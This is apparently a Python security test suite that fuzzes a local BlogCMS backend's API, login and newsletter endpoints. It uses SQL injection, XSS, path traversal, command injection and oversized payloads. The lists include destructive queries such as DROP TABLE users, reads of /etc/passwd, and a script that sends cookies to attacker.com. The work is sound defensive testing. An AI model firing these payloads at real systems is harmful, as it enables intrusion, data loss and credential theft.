#!/usr/bin/env python3
"""
Comprehensive Security Testing Suite for BlogCMS
Tests for SQL Injection, XSS, Buffer Overflow, and other vulnerabilities

USAGE: python security_test_suite.py
"""

import requests
import json
import time
import sys
from typing import List, Dict, Any, Tuple
from datetime import datetime
from urllib.parse import quote

# Configuration
BASE_URL = "http://localhost:8100"
API_URL = f"{BASE_URL}/api/v1"
AUTH_URL = f"{BASE_URL}/auth"

# Color codes for output
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

# Global results storage
test_results = {
    "total_tests": 0,
    "passed": 0,
    "failed": 0,
    "vulnerabilities": [],
    "start_time": datetime.now()
}

#===============================================================================
# SQL INJECTION PAYLOADS
#===============================================================================

SQL_INJECTION_PAYLOADS = [
    # Classic SQL injection
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR '1'='1' #",
    "admin'--",
    "admin' #",
    "admin'/*",
    "' or 1=1--",
    "' or 1=1#",
    "' or 1=1/*",
    "') or '1'='1--",
    "') or ('1'='1--",

    # UNION-based injection
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT username, password FROM users--",
    "' UNION ALL SELECT NULL,NULL,NULL--",

    # Boolean-based blind injection
    "' AND '1'='1",
    "' AND '1'='2",
    "' AND 1=1--",
    "' AND 1=2--",

    # Time-based blind injection
    "'; WAITFOR DELAY '00:00:05'--",
    "'; SELECT SLEEP(5)--",
    "' OR SLEEP(5)--",
    "'; pg_sleep(5)--",
    "' OR pg_sleep(5)--",

    # Stacked queries
    "'; DROP TABLE users--",
    "'; DELETE FROM users--",
    "'; UPDATE users SET password='hacked'--",
    "'; INSERT INTO users VALUES('hacker','hacked')--",

    # Comment-based injection
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR '1'='1' /*",
    "' OR '1'='1' ;--",

    # Error-based injection
    "' AND 1=CONVERT(int, (SELECT @@version))--",
    "' AND 1=CAST((SELECT @@version) AS int)--",

    # Second-order injection
    "admin'--",
    "1' AND '1'='1",

    # Encoded payloads
    "%27%20OR%20%271%27%3D%271",
    "%27%20OR%201%3D1--",

    # NoSQL injection (in case of MongoDB)
    "' || '1'=='1",
    "' && '1'=='1",
    "admin' || '1'=='1",

    # Advanced SQLite specific
    "' OR 1=1 LIMIT 1--",
    "' UNION SELECT sql FROM sqlite_master--",

    # PostgreSQL specific
    "'; SELECT version()--",
    "' OR 1=1; SELECT * FROM pg_user--",

    # MySQL specific
    "' OR 1=1; SELECT * FROM mysql.user--",
    "' UNION SELECT user(), database(), version()--",
]

#===============================================================================
# XSS PAYLOADS
#===============================================================================

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    "<body onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<script>fetch('http://attacker.com?cookie='+document.cookie)</script>",
    "'-alert('XSS')-'",
    "\"><script>alert('XSS')</script>",
    "<img src=\"x\" onerror=\"alert('XSS')\">",
    "<svg><script>alert('XSS')</script></svg>",
    "<img src=x:alert(alt) onerror=eval(src) alt=xss>",
    "<details/open/ontoggle=alert('XSS')>",
    "<marquee onstart=alert('XSS')>",
]

#===============================================================================
# BUFFER OVERFLOW / LARGE PAYLOAD TESTS
#===============================================================================

def load_large_payload():
    """Load the large payload from file"""
    try:
        with open('CTemplarge_payload.json', 'r') as f:
            data = json.load(f)
            return data.get('name', 'A' * 10000)
    except:
        # Fallback: generate large payload
        return 'A' * 2000000  # 2MB of 'A' characters

LARGE_PAYLOAD = load_large_payload()
BUFFER_OVERFLOW_PAYLOADS = [
    'A' * 1000,      # 1KB
    'A' * 10000,     # 10KB
    'A' * 100000,    # 100KB
    'A' * 1000000,   # 1MB
    LARGE_PAYLOAD,   # 2MB from file
    '%s' * 1000,     # Format string
    '%n' * 1000,     # Format string (write)
]

#===============================================================================
# PATH TRAVERSAL PAYLOADS
#===============================================================================

PATH_TRAVERSAL_PAYLOADS = [
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
]

#===============================================================================
# COMMAND INJECTION PAYLOADS
#===============================================================================

COMMAND_INJECTION_PAYLOADS = [
    "; ls -la",
    "| ls -la",
    "& ls -la",
    "`ls -la`",
    "$(ls -la)",
    "; whoami",
    "| whoami",
    "& whoami",
    "`whoami`",
    "$(whoami)",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
]

#===============================================================================
# HELPER FUNCTIONS
#===============================================================================

def print_header(text: str):
    """Print a section header"""
    print(f"\n{Colors.HEADER}{Colors.BOLD}{'='*80}")
    print(f"{text}")
    print(f"{'='*80}{Colors.ENDC}")

def print_subheader(text: str):
    """Print a subsection header"""
    print(f"\n{Colors.OKCYAN}{Colors.BOLD}{text}{Colors.ENDC}")

def print_test(name: str):
    """Print test name"""
    print(f"{Colors.OKBLUE}[TEST] {name}{Colors.ENDC}", end=' ... ')

def print_pass():
    """Print pass status"""
    print(f"{Colors.OKGREEN}PASS{Colors.ENDC}")
    test_results["passed"] += 1

def print_fail(details: str = ""):
    """Print fail status"""
    print(f"{Colors.FAIL}FAIL{Colors.ENDC}")
    if details:
        print(f"{Colors.WARNING}  └─ {details}{Colors.ENDC}")
    test_results["failed"] += 1

def print_vuln(severity: str, endpoint: str, payload: str, details: str):
    """Print vulnerability found"""
    print(f"{Colors.FAIL}{Colors.BOLD}[VULNERABILITY FOUND]{Colors.ENDC}")
    print(f"  Severity: {severity}")
    print(f"  Endpoint: {endpoint}")
    print(f"  Payload: {payload[:100]}...")
    print(f"  Details: {details}")

    test_results["vulnerabilities"].append({
        "severity": severity,
        "endpoint": endpoint,
        "payload": payload,
        "details": details,
        "timestamp": datetime.now().isoformat()
    })

def increment_test():
    """Increment test counter"""
    test_results["total_tests"] += 1

#===============================================================================
# TEST FUNCTIONS
#===============================================================================

def test_sql_injection_query_param(endpoint: str, param: str, safe_value: str = "test"):
    """Test SQL injection in query parameters"""
    print_subheader(f"Testing SQL Injection: {endpoint} (param: {param})")

    vulnerabilities_found = 0

    for payload in SQL_INJECTION_PAYLOADS[:20]:  # Test first 20 payloads
        increment_test()
        print_test(f"Payload: {payload[:50]}")

        try:
            # Test with payload
            response = requests.get(
                endpoint,
                params={param: payload},
                timeout=6  # Timeout to detect time-based injections
            )

            # Check for SQL errors in response
            if any(error in response.text.lower() for error in [
                'sql syntax', 'sqlite', 'postgresql', 'mysql', 'mariadb',
                'ora-', 'syntax error', 'database error', 'query failed',
                'sqlalchemy', 'integrity error', 'constraint'
            ]):
                print_vuln(
                    "HIGH",
                    endpoint,
                    payload,
                    f"SQL error leaked in response on parameter '{param}'"
                )
                vulnerabilities_found += 1
                print_fail(f"SQL error detected: {response.text[:100]}")

            # Check for time delays (time-based injection)
            elif response.elapsed.total_seconds() > 5:
                print_vuln(
                    "CRITICAL",
                    endpoint,
                    payload,
                    f"Time-based SQL injection possible on parameter '{param}' (delay: {response.elapsed.total_seconds()}s)"
                )
                vulnerabilities_found += 1
                print_fail(f"Time delay detected: {response.elapsed.total_seconds()}s")

            # Check for boolean-based injection (different response than safe value)
            else:
                # Get baseline response with safe value
                safe_response = requests.get(
                    endpoint,
                    params={param: safe_value},
                    timeout=6
                )

                # If responses are significantly different, might be vulnerable
                if abs(len(response.text) - len(safe_response.text)) > 1000:
                    print_vuln(
                        "MEDIUM",
                        endpoint,
                        payload,
                        f"Boolean-based SQL injection possible on parameter '{param}' (response length differs)"
                    )
                    vulnerabilities_found += 1
                    print_fail(f"Response length differs significantly")
                else:
                    print_pass()

        except requests.exceptions.Timeout:
            print_vuln(
                "CRITICAL",
                endpoint,
                payload,
                f"Request timeout - possible time-based SQL injection on parameter '{param}'"
            )
            vulnerabilities_found += 1
            print_fail("Request timeout")

        except Exception as e:
            print_fail(f"Error: {str(e)}")

    return vulnerabilities_found

def test_sql_injection_path_param(endpoint_template: str, safe_id: str = "1"):
    """Test SQL injection in path parameters"""
    print_subheader(f"Testing SQL Injection in Path: {endpoint_template}")

    vulnerabilities_found = 0

    for payload in SQL_INJECTION_PAYLOADS[:15]:  # Test first 15 payloads
        increment_test()
        print_test(f"Payload: {payload[:50]}")

        try:
            # Replace placeholder with payload
            endpoint = endpoint_template.replace("{id}", quote(payload))

            response = requests.get(endpoint, timeout=6)

            # Check for SQL errors
            if any(error in response.text.lower() for error in [
                'sql syntax', 'sqlite', 'postgresql', 'mysql',
                'syntax error', 'database error'
            ]):
                print_vuln(
                    "HIGH",
                    endpoint,
                    payload,
                    "SQL error leaked in path parameter"
                )
                vulnerabilities_found += 1
                print_fail(f"SQL error detected")
            else:
                print_pass()

        except requests.exceptions.Timeout:
            print_vuln(
                "CRITICAL",
                endpoint,
                payload,
                "Request timeout - possible time-based SQL injection in path parameter"
            )
            vulnerabilities_found += 1
            print_fail("Request timeout")

        except Exception as e:
            print_fail(f"Error: {str(e)}")

    return vulnerabilities_found

def test_xss_injection(endpoint: str, param: str):
    """Test XSS injection in parameters"""
    print_subheader(f"Testing XSS: {endpoint} (param: {param})")

    vulnerabilities_found = 0

    for payload in XSS_PAYLOADS[:10]:  # Test first 10 payloads
        increment_test()
        print_test(f"Payload: {payload[:50]}")

        try:
            response = requests.get(
                endpoint,
                params={param: payload},
                timeout=5
            )

            # Check if payload is reflected without encoding
            if payload in response.text:
                print_vuln(
                    "HIGH",
                    endpoint,
                    payload,
                    f"XSS payload reflected without encoding in parameter '{param}'"
                )
                vulnerabilities_found += 1
                print_fail("Payload reflected unencoded")
            else:
                print_pass()

        except Exception as e:
            print_fail(f"Error: {str(e)}")

    return vulnerabilities_found

def test_buffer_overflow(endpoint: str, param: str, method: str = "GET"):
    """Test buffer overflow with large payloads"""
    print_subheader(f"Testing Buffer Overflow: {endpoint} (param: {param})")

    vulnerabilities_found = 0

    for i, payload in enumerate(BUFFER_OVERFLOW_PAYLOADS):
        increment_test()
        size = len(payload)
        print_test(f"Payload size: {size} bytes")

        try:
            if method == "GET":
                response = requests.get(
                    endpoint,
                    params={param: payload},
                    timeout=10
                )
            else:  # POST
                response = requests.post(
                    endpoint,
                    json={param: payload},
                    timeout=10
                )

            # Check for 500 errors or crashes
            if response.status_code == 500:
                print_vuln(
                    "CRITICAL",
                    endpoint,
                    f"Payload of {size} bytes",
                    f"Server error (500) with {size} byte payload - possible buffer overflow"
                )
                vulnerabilities_found += 1
                print_fail(f"Server error 500")
            elif response.status_code not in [200, 400, 404, 422]:
                print_vuln(
                    "HIGH",
                    endpoint,
                    f"Payload of {size} bytes",
                    f"Unexpected status code {response.status_code} with large payload"
                )
                vulnerabilities_found += 1
                print_fail(f"Unexpected status: {response.status_code}")
            else:
                print_pass()

        except requests.exceptions.ConnectionError:
            print_vuln(
                "CRITICAL",
                endpoint,
                f"Payload of {size} bytes",
                f"Connection error - server may have crashed with {size} byte payload"
            )
            vulnerabilities_found += 1
            print_fail("Connection error - possible crash")

        except requests.exceptions.Timeout:
            print_vuln(
                "HIGH",
                endpoint,
                f"Payload of {size} bytes",
                f"Request timeout with {size} byte payload"
            )
            vulnerabilities_found += 1
            print_fail("Request timeout")

        except Exception as e:
            print_fail(f"Error: {str(e)}")

    return vulnerabilities_found

def test_auth_endpoint():
    """Test authentication endpoint"""
    print_header("TESTING AUTHENTICATION ENDPOINTS")

    vulns = 0

    # Test login endpoint
    endpoint = f"{AUTH_URL}/login"

    # SQL injection in username
    vulns += test_sql_injection_query_param(endpoint, "username")

    # SQL injection in password (via form data)
    print_subheader("Testing SQL Injection in Login Form")
    for payload in SQL_INJECTION_PAYLOADS[:10]:
        increment_test()
        print_test(f"Password payload: {payload[:50]}")

        try:
            response = requests.post(
                endpoint,
                data={"username": "admin", "password": payload},
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                timeout=5
            )

            if any(error in response.text.lower() for error in ['sql', 'syntax', 'database']):
                print_vuln("HIGH", endpoint, payload, "SQL error in login password field")
                vulns += 1
                print_fail("SQL error detected")
            else:
                print_pass()
        except Exception as e:
            print_fail(f"Error: {str(e)}")

    # Buffer overflow in login
    vulns += test_buffer_overflow(f"{AUTH_URL}/login", "username", "POST")

    return vulns

def test_blog_endpoints():
    """Test blog endpoints"""
    print_header("TESTING BLOG ENDPOINTS")

    vulns = 0

    # Public endpoints
    endpoints_to_test = [
        (f"{API_URL}/blog/posts", "search"),
        (f"{API_URL}/blog/posts", "tag"),
        (f"{API_URL}/blog/posts", "page"),
        (f"{API_URL}/blog/posts", "page_size"),
        (f"{API_URL}/blog/posts", "category_id"),
        (f"{API_URL}/blog/categories", "parent_id"),
    ]

    for endpoint, param in endpoints_to_test:
        vulns += test_sql_injection_query_param(endpoint, param)
        vulns += test_xss_injection(endpoint, param)

    # Path parameter tests
    vulns += test_sql_injection_path_param(f"{API_URL}/blog/posts/{{id}}")
    vulns += test_sql_injection_path_param(f"{API_URL}/blog/categories/{{id}}")
    vulns += test_sql_injection_path_param(f"{API_URL}/blog/tags/{{id}}")

    # Buffer overflow tests
    vulns += test_buffer_overflow(f"{API_URL}/blog/posts", "search")

    return vulns

def test_newsletter_endpoints():
    """Test newsletter endpoints"""
    print_header("TESTING NEWSLETTER ENDPOINTS")

    vulns = 0

    endpoint = f"{API_URL}/newsletter/subscribe"

    # SQL injection in email field
    print_subheader("Testing SQL Injection in Newsletter Subscribe")
    for payload in SQL_INJECTION_PAYLOADS[:15]:
        increment_test()
        print_test(f"Email payload: {payload[:50]}")

        try:
            response = requests.post(
                endpoint,
                json={"email": payload},
                timeout=5
            )

            if any(error in response.text.lower() for error in ['sql', 'syntax', 'database', 'integrity']):
                print_vuln("HIGH", endpoint, payload, "SQL error in newsletter email field")
                vulns += 1
                print_fail("SQL error detected")
            else:
                print_pass()
        except Exception as e:
            print_fail(f"Error: {str(e)}")

    # XSS in email field
    print_subheader("Testing XSS in Newsletter Subscribe")
    for payload in XSS_PAYLOADS[:10]:
        increment_test()
        print_test(f"Email payload: {payload[:50]}")

        try:
            response = requests.post(
                endpoint,
                json={"email": payload},
                timeout=5
            )

            if payload in response.text:
                print_vuln("MEDIUM", endpoint, payload, "XSS payload reflected in newsletter response")
                vulns += 1
                print_fail("Payload reflected")
            else:
                print_pass()
        except Exception as e:
            print_fail(f"Error: {str(e)}")

    # Buffer overflow
    vulns += test_buffer_overflow(endpoint, "email", "POST")

    # Test unsubscribe endpoint
    unsubscribe_endpoint = f"{API_URL}/newsletter/unsubscribe/{{id}}"
    vulns += test_sql_injection_path_param(unsubscribe_endpoint)

    return vulns

def test_pages_endpoints():
    """Test pages endpoints"""
    print_header("TESTING PAGES ENDPOINTS")

    vulns = 0

    # Public endpoints
    endpoints_to_test = [
        (f"{API_URL}/pages", "skip"),
        (f"{API_URL}/pages", "limit"),
        (f"{API_URL}/pages/by-canonical", "url"),
    ]

    for endpoint, param in endpoints_to_test:
        vulns += test_sql_injection_query_param(endpoint, param)
        vulns += test_xss_injection(endpoint, param)

    # Path parameter tests
    vulns += test_sql_injection_path_param(f"{API_URL}/pages/{{id}}")

    return vulns

def generate_report():
    """Generate final vulnerability report"""
    print_header("SECURITY TEST REPORT")

    duration = (datetime.now() - test_results["start_time"]).total_seconds()

    print(f"\nTest Duration: {duration:.2f} seconds")
    print(f"Total Tests: {test_results['total_tests']}")
    print(f"{Colors.OKGREEN}Passed: {test_results['passed']}{Colors.ENDC}")
    print(f"{Colors.FAIL}Failed: {test_results['failed']}{Colors.ENDC}")
    print(f"\n{Colors.FAIL}{Colors.BOLD}Vulnerabilities Found: {len(test_results['vulnerabilities'])}{Colors.ENDC}")

    if test_results['vulnerabilities']:
        print(f"\n{Colors.FAIL}{Colors.BOLD}VULNERABILITY DETAILS:{Colors.ENDC}")

        # Group by severity
        critical = [v for v in test_results['vulnerabilities'] if v['severity'] == 'CRITICAL']
        high = [v for v in test_results['vulnerabilities'] if v['severity'] == 'HIGH']
        medium = [v for v in test_results['vulnerabilities'] if v['severity'] == 'MEDIUM']

        if critical:
            print(f"\n{Colors.FAIL}{Colors.BOLD}CRITICAL ({len(critical)}):{Colors.ENDC}")
            for v in critical:
                print(f"  • {v['endpoint']}")
                print(f"    {v['details']}")

        if high:
            print(f"\n{Colors.WARNING}{Colors.BOLD}HIGH ({len(high)}):{Colors.ENDC}")
            for v in high:
                print(f"  • {v['endpoint']}")
                print(f"    {v['details']}")

        if medium:
            print(f"\n{Colors.OKBLUE}{Colors.BOLD}MEDIUM ({len(medium)}):{Colors.ENDC}")
            for v in medium:
                print(f"  • {v['endpoint']}")
                print(f"    {v['details']}")

    # Save to JSON file
    report_file = f"security_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(report_file, 'w') as f:
        json.dump(test_results, f, indent=2, default=str)

    print(f"\n{Colors.OKGREEN}Full report saved to: {report_file}{Colors.ENDC}")

#===============================================================================
# MAIN EXECUTION
#===============================================================================

def main():
    """Main test execution"""
    print_header("BlogCMS Security Test Suite")
    print(f"Target: {BASE_URL}")
    print(f"Start Time: {test_results['start_time'].strftime('%Y-%m-%d %H:%M:%S')}")

    # Check if server is running
    try:
        response = requests.get(f"{BASE_URL}/health", timeout=5)
        if response.status_code == 200:
            print(f"{Colors.OKGREEN}[OK] Server is running{Colors.ENDC}")
        else:
            print(f"{Colors.FAIL}[ERROR] Server returned status {response.status_code}{Colors.ENDC}")
            return
    except:
        print(f"{Colors.FAIL}[ERROR] Cannot connect to server at {BASE_URL}{Colors.ENDC}")
        print(f"{Colors.WARNING}Please start the backend server first: cd backend && python -m uvicorn app.main:app --port 8100{Colors.ENDC}")
        return

    # Run all tests
    total_vulns = 0

    try:
        total_vulns += test_auth_endpoint()
        total_vulns += test_blog_endpoints()
        total_vulns += test_newsletter_endpoints()
        total_vulns += test_pages_endpoints()

        # TODO: Add more endpoint tests
        # total_vulns += test_navigation_endpoints()
        # total_vulns += test_theme_endpoints()
        # total_vulns += test_site_settings_endpoints()

    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}Testing interrupted by user{Colors.ENDC}")

    finally:
        # Generate final report
        generate_report()

        # Exit with appropriate code
        if total_vulns > 0:
            sys.exit(1)
        else:
            sys.exit(0)

if __name__ == "__main__":
    main()
